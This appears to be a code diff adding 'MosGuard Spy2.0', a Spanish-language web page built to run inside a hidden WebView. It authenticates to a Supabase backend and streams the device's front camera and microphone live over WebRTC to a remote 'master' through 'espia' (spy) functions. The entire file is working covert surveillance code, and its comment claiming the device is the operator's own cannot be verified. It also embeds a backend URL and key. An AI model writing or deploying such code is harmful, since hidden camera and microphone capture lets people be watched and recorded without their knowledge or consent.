@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MosGuard · en vivo</title>
+<style>html,body{margin:0;height:100%;background:#000;color:#0f0;font:12px monospace;overflow:hidden}
+#log{position:fixed;inset:0;padding:8px;white-space:pre-wrap;opacity:.35}</style></head>
+<body><div id="log"></div>
+<script>
+// [MosGuard · Spy2.0] Página de STREAMING que corre dentro del WebView oculto de MosGuard. Reusa el
+// motor de espía de Supabase (RPCs espia_*): el equipo es el que RESPONDE la oferta del master
+// (cámara + micrófono en vivo). Autenticación vía mint-guard (secreto del equipo → JWT app=mosGuard).
+// Parámetros por URL: ?secreto=<secreto>&sesion=<sesionId>&device=<nombre>
+(function () {
+  var SB = 'https://rzbzdeipbtqkzjqdchqk.supabase.co';
+  var ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ6YnpkZWlwYnRxa3pqcWRjaHFrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4NzYwMDQsImV4cCI6MjA5NjQ1MjAwNH0.MAlSdz_ugGUZoaU5st6dA_gb_x_IiUL0TXxH176kY9k';
+  var q = new URLSearchParams(location.search);
+  var SECRETO = q.get('secreto') || '', SESION = q.get('sesion') || '', DEVICE = q.get('device') || '';
+  var logEl = document.getElementById('log'); var _n = 0;
+  function log(m) { _n++; logEl.textContent = ('[' + _n + '] ' + m + '\n' + logEl.textContent).slice(0, 4000); }
+
+  var TOKEN = '';
+  function rpc(fn, params) {
+    return fetch(SB + '/rest/v1/rpc/' + fn, {
+      method: 'POST',
+      headers: { 'apikey': ANON, 'Authorization': 'Bearer ' + (TOKEN || ANON), 'Content-Type': 'application/json', 'Content-Profile': 'mos' },
+      body: JSON.stringify({ p: params || {} })
+    }).then(function (r) { return r.json().catch(function () { return null; }); }).catch(function () { return null; });
+  }
+
+  var pc = null, stream = null, iceDesde = 0, ofertaAplicada = false, cerrado = false, colaIce = [];
+  var pollT = null, pushT = null;
+
+  function cerrar(motivo) {
+    if (cerrado) return; cerrado = true; log('cerrar: ' + motivo);
+    try { if (pollT) clearInterval(pollT); } catch (e) {}
+    try { if (pushT) clearInterval(pushT); } catch (e) {}
+    try { if (stream) stream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+    try { if (pc) pc.close(); } catch (e) {}
+    try { rpc('espia_cerrar_sesion', { sesionId: SESION, lado: 'device', motivo: motivo }); } catch (e) {}
+  }
+
+  async function arrancar() {
+    if (!SECRETO || !SESION || !DEVICE) { log('faltan parámetros'); return; }
+    // 1) JWT del equipo (secreto → app=mosGuard)
+    var m = await fetch(SB + '/functions/v1/mint-guard', { method: 'POST', headers: { 'apikey': ANON, 'Content-Type': 'application/json' }, body: JSON.stringify({ secreto: SECRETO }) }).then(function (r) { return r.json(); }).catch(function () { return null; });
+    if (!m || !m.ok || !m.token) { log('mint-guard falló'); return; }
+    TOKEN = m.token;
+    if (m.deviceId) DEVICE = m.deviceId;   // el nombre autoritativo que resolvió el servidor por el secreto
+    log('token ok · device ' + DEVICE);
+
+    // 2) unirse a la sesión + config (ICE/TURN)
+    var ini = await rpc('espia_iniciar_dispositivo', { sesionId: SESION, deviceId: DEVICE });
+    if (!ini || !ini.ok) { log('iniciar_dispositivo: ' + (ini && ini.error || '?')); return; }
+    var cfg = await rpc('espia_config', {});
+    var iceServers = (cfg && cfg.ok && cfg.data && cfg.data.iceServers) ? cfg.data.iceServers : [{ urls: ['stun:stun.l.google.com:19302'] }];
+    log('ice servers: ' + iceServers.length);
+
+    // 3) cámara + micrófono (audio ON: es equipo propio, como Spy 2.0)
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 } }, audio: true });
+    } catch (e) {
+      try { stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); }
+      catch (e2) { try { stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); } catch (e3) { log('getUserMedia falló: ' + (e3 && e3.name)); return; } }
+    }
+    log('media: ' + stream.getVideoTracks().length + 'v ' + stream.getAudioTracks().length + 'a');
+
+    pc = new RTCPeerConnection({ iceServers: iceServers });
+    stream.getTracks().forEach(function (t) { pc.addTrack(t, stream); });
+    pc.onicecandidate = function (e) { if (e.candidate) colaIce.push(e.candidate.toJSON()); };
+    pc.onconnectionstatechange = function () {
+      log('pc: ' + pc.connectionState);
+      if (pc.connectionState === 'failed' || pc.connectionState === 'closed') cerrar('pc_' + pc.connectionState);
+    };
+
+    // 4) el equipo RESPONDE: poll de la oferta del master + ICE, sube su answer
+    pollT = setInterval(sync, 700);
+    pushT = setInterval(pushIce, 800);
+  }
+
+  async function sync() {
+    if (cerrado || !pc) return;
+    var r = await rpc('espia_sync', { sesionId: SESION, lado: 'device', iceDesde: iceDesde, necesito: { sdpOferta: !ofertaAplicada, ice: true } });
+    if (!r || !r.ok || !r.data) return;
+    var d = r.data;
+    if (String(d.estado || '').toUpperCase() === 'CERRADA') { cerrar('master_cerro'); return; }
+    // oferta inicial del master → answer
+    if (!ofertaAplicada && d.sdpOferta) {
+      try {
+        await pc.setRemoteDescription(JSON.parse(d.sdpOferta));
+        var ans = await pc.createAnswer();
+        await pc.setLocalDescription(ans);
+        await rpc('espia_subir_respuesta', { sesionId: SESION, sdp: JSON.stringify(ans) });
+        ofertaAplicada = true; log('answer enviado');
+      } catch (e) { log('answer error: ' + (e && e.message)); }
+    }
+    // ICE del master
+    if (Array.isArray(d.ice) && d.ice.length) {
+      for (var i = 0; i < d.ice.length; i++) {
+        try { await pc.addIceCandidate(d.ice[i].candidate || d.ice[i]); } catch (e) {}
+      }
+      if (d.tsMax) iceDesde = d.tsMax;
+    }
+  }
+
+  async function pushIce() {
+    if (cerrado || !colaIce.length) return;
+    var lote = colaIce.splice(0, colaIce.length);
+    await rpc('espia_push_batch', { sesionId: SESION, lado: 'device', ice: lote });
+  }
+
+  window.addEventListener('pagehide', function () { cerrar('pagehide'); });
+  arrancar();
+})();
+</script></body></html>
